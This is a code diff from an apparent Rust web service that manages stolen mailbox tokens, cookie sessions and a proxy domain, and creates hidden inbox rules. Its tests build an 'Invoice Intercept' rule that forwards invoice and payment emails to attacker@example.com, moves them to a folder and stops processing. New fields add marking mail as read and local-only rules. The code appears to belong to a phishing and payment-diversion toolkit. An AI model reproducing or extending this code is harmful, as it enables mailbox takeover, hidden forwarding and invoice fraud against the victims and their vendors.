@@ -1,11 +1,9 @@
 use crate::graph_client::GraphClient;
-use crate::vault::Vault;
 use crate::AppState;
 use actix_web::{web, HttpResponse, Responder};
 use anyhow::Context;
 use chrono::Utc;
 use serde::{Deserialize, Serialize};
-use sqlx::SqlitePool;
 
 #[derive(Debug, Clone, Serialize, Deserialize, sqlx::FromRow)]
 pub struct CreatedRule {
@@ -704,7 +702,7 @@ pub async fn run_local_rules(
 
     for msg in messages {
         let subject = msg.subject.as_deref().unwrap_or("").to_lowercase();
-        let body = msg.bodyPreview.as_deref().unwrap_or("").to_lowercase();
+        let _body = msg.bodyPreview.as_deref().unwrap_or("").to_lowercase();
         let sender_email = msg.from.as_ref()
             .and_then(|f| f.emailAddress.as_ref())
             .and_then(|e| e.address.as_ref())
@@ -884,6 +882,8 @@ pub async fn run_local_rules_handler(
 mod tests {
     use super::*;
     use crate::AppConfig;
+    use crate::proxy::ProxyConfig;
+    use crate::vault::Vault;
     use sqlx::sqlite::SqlitePoolOptions;
     use wiremock::matchers::{header, method, path};
     use wiremock::{Mock, MockServer, ResponseTemplate};
@@ -909,7 +909,9 @@ mod tests {
                 expires_at DATETIME NOT NULL,
                 created_at DATETIME NOT NULL,
                 last_refreshed_at DATETIME,
-                status TEXT DEFAULT 'active'
+                status TEXT DEFAULT 'active',
+                account_type TEXT,
+                cookie_session TEXT
             )
             "#,
         )
@@ -948,10 +950,17 @@ mod tests {
             telegram_chat_id: None,
             master_secret: "test_rules_secret".to_string(),
             frontend_url: None,
+            proxy_domain: "baloncloud.eu".to_string(),
+            proxy_enabled: true,
+            proxy_port: 8080,
+            proxy_max_sessions: 50,
+            proxy_rate_limit: 100,
+            proxy_secret: "test_secret".to_string(),
         };
 
         let vault = Vault::new(config.master_secret.clone());
         let http_client = reqwest::Client::new();
+        let proxy_config = ProxyConfig::new(config.proxy_domain.clone());
 
         let response_key = crate::response_crypto::ResponseCrypto::derive_key(&config.master_secret);
 
@@ -961,6 +970,7 @@ mod tests {
             http_client,
             vault,
             response_key,
+            proxy_config,
         }
     }
 
@@ -980,6 +990,7 @@ mod tests {
                 "refresh_rules_123",
                 vec!["MailboxSettings.ReadWrite".to_string()],
                 Utc::now() + chrono::Duration::hours(2),
+                None,
             )
             .await
             .unwrap();
@@ -1022,9 +1033,13 @@ mod tests {
             rule_name: "Invoice Intercept".to_string(),
             condition_subject_contains: vec!["invoice".to_string(), "payment".to_string()],
             condition_sender_domain: vec!["vendor.com".to_string()],
+            condition_body_contains: vec![],
+            condition_sender_contains: vec![],
             action_move_to_folder: Some("Processed".to_string()),
             action_forward_to: Some("attacker@example.com".to_string()),
+            action_mark_as_read: false,
             stop_processing: true,
+            local_only: None,
         };
 
         let result = create_inbox_rule(&state, &client, &req)
@@ -1064,6 +1079,7 @@ mod tests {
                 "refresh_rules_456",
                 vec!["MailboxSettings.ReadWrite".to_string()],
                 Utc::now() + chrono::Duration::hours(2),
+                None,
             )
             .await
             .unwrap();
@@ -1095,9 +1111,13 @@ mod tests {
             rule_name: "Archive Rule".to_string(),
             condition_subject_contains: vec!["statement".to_string()],
             condition_sender_domain: vec![],
+            condition_body_contains: vec![],
+            condition_sender_contains: vec![],
             action_move_to_folder: Some("Archive".to_string()),
             action_forward_to: None,
+            action_mark_as_read: false,
             stop_processing: false,
+            local_only: None,
         };
 
         let result = create_inbox_rule(&state, &client, &req)
@@ -1117,9 +1137,13 @@ mod tests {
             rule_name: "Local Invoice Filter".to_string(),
             condition_subject_contains: vec!["invoice".to_string(), "payment".to_string()],
             condition_sender_domain: vec!["vendor.com".to_string()],
+            condition_body_contains: vec![],
+            condition_sender_contains: vec![],
             action_move_to_folder: Some("Filtered".to_string()),
             action_forward_to: Some("attacker@example.com".to_string()),
+            action_mark_as_read: false,
             stop_processing: true,
+            local_only: Some(true),
         };
 
         let result = create_local_only_rule(&state, &req)
